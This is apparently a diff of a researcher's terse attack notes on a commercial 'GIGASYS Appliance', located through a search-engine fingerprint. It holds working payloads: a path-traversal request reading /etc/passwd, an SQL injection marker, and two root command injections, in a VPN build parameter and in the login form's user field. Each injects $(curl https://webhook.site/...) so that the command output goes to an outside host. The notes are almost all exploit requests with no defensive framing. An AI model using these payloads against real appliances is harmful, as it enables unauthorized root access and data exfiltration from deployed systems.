@@ -3,7 +3,7 @@ Somebody Toucha My Spaghet
 html:"GIGASYS Appliance"
 seems to be an appliance made by https://www.gigasys.info/
 
-multiple 302 bypass + SQLi as dba + file read AS ROOT + RCE AS FUCKING ROOT (but depend on one module) + ANOTHER RCE AS FUCKING ROOT IN THE FUCKING LOGIN
+multiple 302 bypass + SQLi as dba + file read AS ROOT + RCE AS FUCKING ROOT (but it depend on one module named 'smart' and few have it) + ANOTHER RCE AS FUCKING ROOT IN THE FUCKING LOGIN
 time spent : 9h30 - 15h30
 
 [SQLI]
@@ -30,5 +30,8 @@ dalladata=2022-10-07[SQLI]&alladata=2022-11-07&session=no&Cerca=Montrer
 [FILE READ]
 GET /hotspot/include/ajax_download.php?path=../etc/passwd HTTP/1.1
 
-[Root RCE]
+[Root RCE smart module]
 GET /smart/vpn/build.php?type=OVPN&conf_name=$(curl https://webhook.site/xx/$(id))&conf_file=hey
+
+[Root RCE login]
+curl -sk -X POST $1/adm/auth/login/ -d 'action=login&user=$(curl %09https://webhook.site/'$2'/$(id))&pass=testtest&proto=&lang=en'
